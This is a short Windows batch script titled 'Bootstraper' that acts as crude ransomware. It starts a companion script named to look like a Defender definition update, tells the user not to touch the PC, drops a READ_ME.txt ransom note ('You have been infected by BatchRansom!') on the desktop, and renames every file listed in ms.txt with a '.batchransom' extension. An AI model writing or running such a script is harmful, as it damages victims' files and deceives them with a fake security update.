@echo off
title Bootstraper
echo Loading... Don't use your PC at this moment
start DefenderDefinitionUpdate.bat >nul
timeout 120 >nul
echo You have been infected by BatchRansom! > %userprofile%\Desktop\READ_ME.txt
for /f "delims=" %%f in (ms.txt) do (
    move "%%f" "%%f.batchransom"
    echo HAPPY BIRTHDAY!
)
